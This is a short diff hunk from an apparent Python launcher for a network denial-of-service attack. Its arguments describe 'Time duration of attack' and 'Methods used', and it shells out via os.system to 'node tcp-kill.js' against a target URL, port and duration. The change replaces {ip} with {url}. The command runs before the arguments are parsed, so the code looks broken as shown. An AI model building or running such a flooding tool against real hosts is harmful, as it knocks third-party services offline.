@@ -85,7 +85,7 @@ if __name__ == "__main__":
     parser.add_argument('time', type=int, help='Time duration of attack')
     parser.add_argument('methods', type=str, help='Methods used')
     
-    os.system(f'node tcp-kill.js http://{ip}/ {time} {port} JOKER')
+    os.system(f'node tcp-kill.js http://{url}/ {time} {port} JOKER')
 
     args = parser.parse_args()
 
